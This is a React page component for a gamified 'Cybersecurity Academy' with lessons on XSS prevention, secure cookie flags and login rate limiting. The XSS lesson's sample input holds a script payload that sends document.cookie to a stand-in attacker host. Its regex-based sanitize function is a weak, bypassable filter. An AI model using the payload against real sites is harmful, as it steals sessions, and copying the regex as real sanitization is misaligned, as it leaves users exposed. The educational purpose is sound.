import { useState } from 'react';
import { motion } from 'framer-motion';
import DashboardLayout from '../layouts/DashboardLayout';
import { ShieldCheck, ShieldAlert, Lock, UserCheck, Key, AlertTriangle, CheckCircle2, Play, Target } from 'lucide-react';

const securityTopics = [
  {
    id: 'xss',
    title: 'XSS Prevention',
    level: 'Advanced',
    icon: <ShieldAlert className="text-red-400" />,
    description: 'Learn how to sanitize user input to prevent Cross-Site Scripting (XSS) attacks.',
    challenge: 'Filter out script tags from a user comment.',
    code: 'const userInput = "<script>fetch(\'https://hacker.com?stolen=\' + document.cookie)</script> Nice post!";\n\n// How would you sanitize this?\nfunction sanitize(input) {\n  return input.replace(/<script\\b[^>]*>([\\s\\S]*?)<\\/script>/gm, "");\n}'
  },
  {
    id: 'auth',
    title: 'Secure Authentication',
    level: 'Expert',
    icon: <Lock className="text-blue-400" />,
    description: 'Best practices for handling JWTs, sessions, and multi-factor authentication.',
    challenge: 'Implement secure cookie storage flags.',
    code: 'res.cookie(\'token\', jwtToken, {\n  httpOnly: true,\n  secure: true, // Only over HTTPS\n  sameSite: \'strict\',\n  maxAge: 3600000\n});'
  },
  {
    id: 'api',
    title: 'API Security',
    level: 'Intermediate',
    icon: <Key className="text-yellow-400" />,
    description: 'Protect your API endpoints from unauthorized access and brute force attacks.',
    challenge: 'Implement rate limiting for sensitive routes.',
    code: 'const rateLimit = require("express-rate-limit");\n\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 5,\n  message: "Too many login attempts."\n});'
  }
];

export default function Cybersecurity() {
  const [activeTopic, setActiveTopic] = useState(securityTopics[0]);

  return (
    <DashboardLayout>
      <div className="px-6 pb-20">
        {/* Header */}
        <div className="mb-10">
          <h1 className="text-3xl font-bold text-white flex items-center gap-3">
            <ShieldCheck className="text-green-400" size={32} /> Cybersecurity Academy
          </h1>
          <p className="text-gray-400 mt-1">Master secure JavaScript development and protect your applications.</p>
        </div>

        <div className="grid grid-cols-1 xl:grid-cols-3 gap-8">
          {/* Topic List */}
          <div className="space-y-4">
            <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest px-4">Learning Tracks</h3>
            {securityTopics.map(topic => (
              <motion.div
                key={topic.id}
                whileHover={{ x: 5 }}
                onClick={() => setActiveTopic(topic)}
                className={`p-6 rounded-[2rem] border cursor-pointer transition-all ${
                  activeTopic.id === topic.id 
                    ? 'bg-primary/10 border-primary shadow-lg shadow-primary/10' 
                    : 'bg-white/5 border-white/5 hover:border-white/10'
                }`}
              >
                <div className="flex items-center gap-4">
                  <div className="p-3 bg-white/5 rounded-2xl">{topic.icon}</div>
                  <div>
                    <h4 className="font-bold text-white">{topic.title}</h4>
                    <p className="text-[10px] text-gray-500 uppercase font-bold tracking-tighter mt-1">{topic.level} Track</p>
                  </div>
                </div>
              </motion.div>
            ))}

            <div className="mt-8 p-8 rounded-[2rem] bg-gradient-to-br from-red-500/10 to-orange-500/10 border border-red-500/20">
              <div className="flex items-center gap-3 mb-4 text-red-400">
                <AlertTriangle size={20} />
                <h4 className="font-bold uppercase text-xs tracking-widest">Urgent Advisory</h4>
              </div>
              <p className="text-xs text-gray-400 leading-relaxed">
                Log4j vulnerability detected in 3 older modules. Ensure your dependencies are updated to v2.17.1+
              </p>
            </div>
          </div>

          {/* Interactive Learning Area */}
          <div className="xl:col-span-2 space-y-6">
            <motion.div 
              key={activeTopic.id}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="glass-card p-10 relative overflow-hidden"
            >
              <div className="absolute top-0 right-0 w-64 h-64 bg-primary/5 blur-3xl rounded-full" />
              
              <div className="flex flex-col md:flex-row justify-between items-start gap-6 mb-10">
                <div>
                  <h2 className="text-4xl font-bold text-white mb-4">{activeTopic.title}</h2>
                  <p className="text-gray-400 leading-relaxed max-w-xl">
                    {activeTopic.description}
                  </p>
                </div>
                <div className="px-6 py-2 bg-green-500/10 text-green-500 border border-green-500/20 rounded-full text-xs font-bold flex items-center gap-2">
                  <UserCheck size={14} /> Earn +1000 XP
                </div>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-10">
                <div className="space-y-8">
                  <section>
                    <h4 className="text-sm font-bold text-gray-300 uppercase tracking-widest mb-4 flex items-center gap-2">
                      <ShieldCheck size={16} className="text-green-400" /> Secure Practice
                    </h4>
                    <div className="space-y-3">
                      <div className="flex items-center gap-3 text-sm text-gray-400">
                        <CheckCircle2 size={16} className="text-green-500" />
                        <span>Never trust user-supplied input.</span>
                      </div>
                      <div className="flex items-center gap-3 text-sm text-gray-400">
                        <CheckCircle2 size={16} className="text-green-500" />
                        <span>Use modern sanitization libraries.</span>
                      </div>
                      <div className="flex items-center gap-3 text-sm text-gray-400">
                        <CheckCircle2 size={16} className="text-green-500" />
                        <span>Enable Content Security Policy (CSP).</span>
                      </div>
                    </div>
                  </section>

                  <section>
                    <h4 className="text-sm font-bold text-gray-300 uppercase tracking-widest mb-4 flex items-center gap-2">
                      <Target size={16} className="text-blue-400" /> Lab Challenge
                    </h4>
                    <p className="text-sm text-gray-400 bg-white/5 border border-white/10 p-4 rounded-xl italic">
                      "{activeTopic.challenge}"
                    </p>
                  </section>
                </div>

                <div className="space-y-4">
                  <div className="flex items-center justify-between px-4 py-2 bg-black/40 rounded-t-xl border-t border-x border-white/10">
                    <span className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">security_lab.js</span>
                    <button className="text-[10px] font-bold text-primary hover:underline flex items-center gap-1">
                      <Play size={10} /> Run Lab
                    </button>
                  </div>
                  <pre className="bg-black p-6 rounded-b-xl border-b border-x border-white/10 text-xs font-mono text-primary-200 leading-relaxed overflow-x-auto min-h-[250px]">
                    {activeTopic.code}
                  </pre>
                </div>
              </div>

              <div className="mt-12 flex gap-4">
                <button className="flex-1 bg-primary text-white py-4 rounded-2xl font-bold hover:bg-primary/90 transition-all shadow-xl shadow-primary/20">
                  Complete Challenge
                </button>
                <button className="px-8 border border-white/10 text-white rounded-2xl hover:bg-white/5 transition-all">
                  Next Track
                </button>
              </div>
            </motion.div>
          </div>
        </div>
      </div>
    </DashboardLayout>
  );
}
